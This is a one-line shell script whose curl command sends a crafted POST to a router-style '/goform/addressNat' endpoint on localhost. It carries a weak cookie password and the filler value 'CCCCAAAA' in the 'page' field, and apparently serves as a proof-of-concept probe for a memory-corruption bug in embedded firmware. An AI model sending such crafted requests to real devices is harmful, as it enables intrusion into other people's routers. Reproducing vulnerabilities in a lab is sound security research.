#!/bin/sh

curl -v -H "X-Requested-With: XMLHttpRequest" -b "password=1234" -e http://localhost:8080/samba.html -H "Content-Type:application/x-www-form-urlencoded" --data "entrys=sync" --data "page=CCCCAAAA" http://localhost:8080/goform/addressNat


